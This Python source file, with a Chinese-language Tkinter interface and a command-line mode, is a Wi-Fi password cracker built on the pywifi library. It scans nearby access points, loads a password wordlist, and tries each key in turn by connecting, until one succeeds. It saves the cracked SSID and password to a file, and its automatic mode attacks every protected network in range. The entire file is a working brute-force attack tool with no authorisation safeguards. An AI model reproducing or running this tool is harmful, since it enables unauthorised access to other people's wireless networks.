#!/usr/bin/env python
# -*- coding:utf-8 -*-
import sys
import time
import argparse
from pywifi import *
from tkinter import Tk, Listbox, Button, Label, StringVar, messagebox, Scrollbar, filedialog
import threading

def get_wifi_interface():
    wifi = PyWiFi()
    if len(wifi.interfaces()) <= 0:
        print('No wifi interface found!')
        exit()
    if len(wifi.interfaces()) == 1:
        print('Wifi interface found: %s' % (wifi.interfaces()[0].name()))
        return wifi.interfaces()[0]
    else:
        print('%-4s   %s' % ('No', 'interface name'))
        for i, w in enumerate(wifi.interfaces()):
            print('%-4s   %s' % (i, w.name()))
        while True:
            iface_no = input('Please choose interface No: ')
            no = int(iface_no)
            if no >= 0 and no < len(wifi.interfaces()):
                return wifi.interfaces()[no]

def get_akm_name(akm_value):
    akm_name_value = {'NONE': 0, 'UNKNOWN': 5, 'WPA': 1, 'WPA2': 3, 'WPA2PSK': 4, 'WPAPSK': 2}
    akm_names = []
    for a in akm_value:
        for k, v in akm_name_value.items():
            if v == a:
                akm_names.append(k)
                break
    if len(akm_names) == 0:
        akm_names.append("OPEN")

    return '/'.join(akm_names)

def get_iface_status(status_code):
    status = {'CONNECTED': 4, 'CONNECTING': 3, 'DISCONNECTED': 0, 'INACTIVE': 2, 'SCANNING': 1}
    for k, v in status.items():
        if v == status_code:
            return k

    return ''

def scan(face):
    ap_list = {}
    print("-" * 72)
    print("%-4s %-20s  %-20s   %-6s   %s" % ('No', 'SSID', 'BSSID', 'SIGNAL', 'ENC/AUTH'))
    face.scan()
    time.sleep(5)
    for i, x in enumerate(face.scan_results()):
        ssid = x.ssid
        if len(ssid) == 0:  # hidden ssid
            ssid = '<length: 0>'
        elif ssid == '\\x00':  # hidden ssid
            ssid = '<length: 1>'
        else:
            if len(x.akm) > 0:  # if len(x.akm)==0 ,the auth is OPEN
                ap_list[x.bssid] = x
        print("%-4s %-20s| %-20s | %-6s | %s" % (i + 1, ssid, x.bssid, x.signal, get_akm_name(x.akm)))

    return face.scan_results(), ap_list

def get_aps(face):
    scan_results, _ = scan(face)
    return scan_results

def test(i, face, x, key, stu, ts):
    showID = x.bssid if len(x.ssid) == 0 or x.ssid == '\\x00' or len(x.ssid) > len(x.bssid) else x.ssid
    key_index = 0
    while key_index < len(key):
        k = key[key_index]
        x.key = k.strip()
        face.remove_all_network_profiles()
        face.connect(face.add_network_profile(x))
        code = -1
        t1 = time.time()
        now = time.time() - t1
        # check connecting status
        while True:
            time.sleep(0.1)
            code = face.status()
            now = time.time() - t1
            # timeout: try next
            if now > ts:
                break
            stu.write("\r%-6s| %-18s| %5.2fs | %-6s %-15s | %-12s" % (i, showID, now, len(key) - key_index, k.strip(), get_iface_status(code)))
            stu.flush()
            # disconnect: maybe fail or busy
            if code == const.IFACE_DISCONNECTED:
                break
            # connect: test success
            elif code == const.IFACE_CONNECTED:
                face.disconnect()
                stu.write("\r%-6s| %-18s| %5.2fs | %-6s %-15s | %-12s\n" % (i, showID, now, len(key) - key_index, k.strip(), 'FOUND!'))
                stu.flush()
                return "%-20s | %s | %15s" % (x.ssid, x.bssid, k)
        # if is busy, then retry:
        if code == const.IFACE_DISCONNECTED and now < 1:
            stu.write("\r%-6s| %-18s| %5.2fs | %-6s %-15s | %-12s" % (i, showID, now, len(key) - key_index, k.strip(), 'BUSY!'))
            stu.flush()
            time.sleep(10)
            continue
        # try next key:
        key_index = key_index + 1

    stu.write("\r%-6s| %-18s| %-6s | %-6s %-15s | %-12s\n" % (i, showID, '', '', '', 'FAIL!'))
    stu.flush()
    return False

def auto_test(keys, timeout, result_file):
    output = sys.stdout
    iface = get_wifi_interface()
    # scan for ap list
    ap_list = {}
    SCAN_NUMBER = 5
    for i in range(SCAN_NUMBER):
        scan_results, scan_ap = scan(iface)
        ap_list.update(scan_ap)
    print('%s\nTEST WIFI LIST:' % ('-' * 72))
    print("%-4s %-20s  %-20s   %-6s   %s" % ('No', 'SSID', 'BSSID', 'SIGNAL', 'ENC/AUTH'))
    item_index = 1
    for k, x in ap_list.items():
        print("%-4s %-20s| %-20s | %-6s | %s" % (item_index, x.ssid, x.bssid, x.signal, get_akm_name(x.akm)))
        item_index = item_index + 1
    print('TOTAL TEST WIFI:%s' % len(ap_list))
    # test
    item_index = 1
    print("%s\n%-6s| %-18s|  %-4s  | %-6s %-15s | %-12s\n%s" % ("-" * 72, "WIFINO", "SSID OR BSSID", "TIME", "KEYNUM", "KEY", "STATUS", "=" * 72))
    for k, v in ap_list.items():
        res = test(item_index, iface, v, keys, output, timeout)
        if res:
            with open(result_file, "a") as f:
                f.write(res)
        item_index = item_index + 1

def manual_test(keys, timeout, result_file):
    output = sys.stdout
    iface = get_wifi_interface()
    # choose one wifi to test
    wifi_no = ''
    scanres = None
    while True:
        # scan for ap list
        scanres, ap_list = scan(iface)
        wifi_no = input('Please choose test No: ')
        if len(wifi_no.strip()) == 0:  # if no choice and press enter, refresh ap list
            continue
        else:
            break
    numbers = wifi_no.strip().split(',')
    print("%s\n%-6s| %-18s|  %-4s  | %-6s %-15s | %-12s\n%s" % ("-" * 72, "WIFINO", "SSID OR BSSID", "TIME", "KEYNUM", "KEY", "STATUS", "=" * 72))
    for no in numbers:
        if int(no) >= 1 and int(no) <= len(scanres):
            res = test(int(no), iface, scanres[int(no) - 1], keys, output, timeout)
            if res:
                with open(result_file, "a") as f:
                    f.write(res)

def main():
    root = Tk()
    root.title("WiFi 测试工具")
    app = WiFiApp(root)
    root.mainloop()

class WiFiApp:
    def __init__(self, master):
        self.master = master
        self.selected_ssid = None
        self.dict_path = None
        self.aps = []
        self.selected_ap = None
        self.testing = False
        self.test_thread = None

        # WiFi 列表
        self.wifi_label = Label(master, text="可用 WiFi 热点:")
        self.wifi_label.pack()

        self.wifi_listbox = Listbox(master, width=50, height=10)
        self.wifi_listbox.pack()
        self.wifi_listbox.bind('<<ListboxSelect>>', self.on_select_wifi)

        # 滚动条
        self.scrollbar = Scrollbar(master)
        self.scrollbar.pack(side="right", fill="y")
        self.wifi_listbox.config(yscrollcommand=self.scrollbar.set)
        self.scrollbar.config(command=self.wifi_listbox.yview)

        # 扫描按钮
        self.scan_button = Button(master, text="扫描 WiFi", command=self.scan_wifi)
        self.scan_button.pack()

        # 选择字典按钮
        self.dict_button = Button(master, text="选择密码字典", command=self.choose_dict)
        self.dict_button.pack()

        # 字典路径显示
        self.dict_label = Label(master, text="未选择字典")
        self.dict_label.pack()

        # 开始测试按钮
        self.test_button = Button(master, text="开始测试", command=self.start_test)
        self.test_button.pack()

        # 取消测试按钮
        self.cancel_button = Button(master, text="取消测试", command=self.cancel_test, state="disabled")
        self.cancel_button.pack()

        # 进度显示
        self.progress_var = StringVar()
        self.progress_var.set("")
        self.progress_label = Label(master, textvariable=self.progress_var)
        self.progress_label.pack()

        # 结果显示
        self.result_var = StringVar()
        self.result_label = Label(master, textvariable=self.result_var)
        self.result_label.pack()

    def scan_wifi(self):
        try:
            self.wifi_listbox.delete(0, 'end')
            iface = get_wifi_interface()
            aps = get_aps(iface)
            
            # 按信号强度排序，信号越强（数值越大）排在越前面
            aps = sorted(aps, key=lambda ap: ap.signal, reverse=True)
            
            self.aps = aps
            for ap in aps:
                ssid = ap.ssid if ap.ssid else '<hidden>'
                enc = get_akm_name(ap.akm)
                self.wifi_listbox.insert('end', f"{ssid} | 信号: {ap.signal} | 加密: {enc}")
        except Exception as e:
            messagebox.showerror("错误", f"扫描失败: {e}")

    def on_select_wifi(self, event):
        selection = event.widget.curselection()
        if selection:
            index = selection[0]
            self.selected_ap = self.aps[index]
            self.selected_ssid = self.selected_ap.ssid

    def choose_dict(self):
        self.dict_path = filedialog.askopenfilename(title="选择密码字典", filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
        if self.dict_path:
            self.dict_label.config(text=self.dict_path)

    timeout = 30
    result_file = 'result.txt'
    keys = []

    def start_test(self):
        if self.testing:
            return
            
        if not self.selected_ssid or not self.dict_path:
            messagebox.showerror("错误", "请先选择 WiFi 和密码字典")
            return

        ap = next((a for a in self.aps if a.ssid == self.selected_ssid), None)
        if not ap:
            messagebox.showerror("错误", "未找到选中的 WiFi")
            return

        try:
            with open(self.dict_path, 'r') as f:
                self.keys = [key.strip() for key in f.readlines() if key.strip()]
        except Exception as e:
            messagebox.showerror("错误", f"读取字典失败: {e}")
            return
            
        # 禁用开始按钮，启用取消按钮
        self.test_button.config(state="disabled")
        self.cancel_button.config(state="normal")
        self.testing = True
        
        # 在后台线程中执行测试
        self.test_thread = threading.Thread(target=self.run_test_in_thread, args=(ap,))
        self.test_thread.daemon = True
        self.test_thread.start()

    def run_test_in_thread(self, ap):
        iface = get_wifi_interface()
        total_keys = len(self.keys)
        
        for i, key in enumerate(self.keys):
            if not self.testing:  # 检查是否取消测试
                break
                
            # 更新进度信息
            progress_text = f"测试中: {i+1}/{total_keys} - 当前密码: {key}"
            self.update_progress(progress_text)
            
            if test_key(iface, ap, key, ts=self.timeout):
                self.update_result(f"成功! SSID: {self.selected_ssid}, 密码: {key}")
                # 生成带时间戳的文件名，精确到秒
                timestamp = time.strftime("%Y%m%d_%H%M%S")
                filename = f"wifi_success_{timestamp}.txt"
                with open(filename, "a") as f:
                    f.write(f"SSID: {self.selected_ssid}, Password: {key}\n")
                self.master.after(0, lambda: messagebox.showinfo("成功", f"密码已保存到 {filename}"))
                break
        else:
            if self.testing:  # 如果不是因为取消而结束
                self.update_result("未找到匹配密码")
        
        # 恢复按钮状态
        self.master.after(0, self.reset_ui)

    def update_progress(self, text):
        # 使用 after 方法在主线程中更新 UI
        self.master.after(0, lambda: self.progress_var.set(text))
        
    def update_result(self, text):
        # 使用 after 方法在主线程中更新 UI
        self.master.after(0, lambda: self.result_var.set(text))
        
    def reset_ui(self):
        self.testing = False
        self.test_button.config(state="normal")
        self.cancel_button.config(state="disabled")
        self.progress_var.set("")
        
    def cancel_test(self):
        if self.testing:
            self.testing = False
            self.update_result("测试已取消")
            # 按钮状态会在线程结束时重置

def build_profile_from_ap(ap, key):
    # 构造用于连接的 Profile，基于扫描到的热点信息
    prof = Profile()
    prof.ssid = ap.ssid
    prof.bssid = ap.bssid
    prof.auth = const.AUTH_ALG_OPEN
    # 根据热点的加密类型选择 AKM 和 Cipher
    if ap.akm:
        if const.AKM_TYPE_WPA2PSK in ap.akm:
            prof.akm = [const.AKM_TYPE_WPA2PSK]
            prof.cipher = const.CIPHER_TYPE_CCMP
            prof.key = key
        elif const.AKM_TYPE_WPAPSK in ap.akm or const.AKM_TYPE_WPA in ap.akm:
            prof.akm = [const.AKM_TYPE_WPAPSK]
            prof.cipher = const.CIPHER_TYPE_TKIP
            prof.key = key
        else:
            prof.akm = [ap.akm[0]]
            prof.cipher = const.CIPHER_TYPE_CCMP
            prof.key = key
    else:
        # 开放网络无需密码
        prof.akm = []
        prof.cipher = const.CIPHER_TYPE_NONE
        prof.key = ''
    return prof

def test_key(face, x, key, ts=30):
    # 使用构造的 Profile 尝试连接，直到成功或超时
    prof = build_profile_from_ap(x, key.strip())
    # 先断开当前连接，清理配置
    face.disconnect()
    time.sleep(0.2)
    face.remove_all_network_profiles()
    tmp = face.add_network_profile(prof)
    face.connect(tmp)
    t1 = time.time()
    while time.time() - t1 < ts:
        status = face.status()
        if status == const.IFACE_CONNECTED:
            face.disconnect()
            return True
        time.sleep(0.5)
    face.disconnect()
    return False

if __name__ == '__main__':
    main()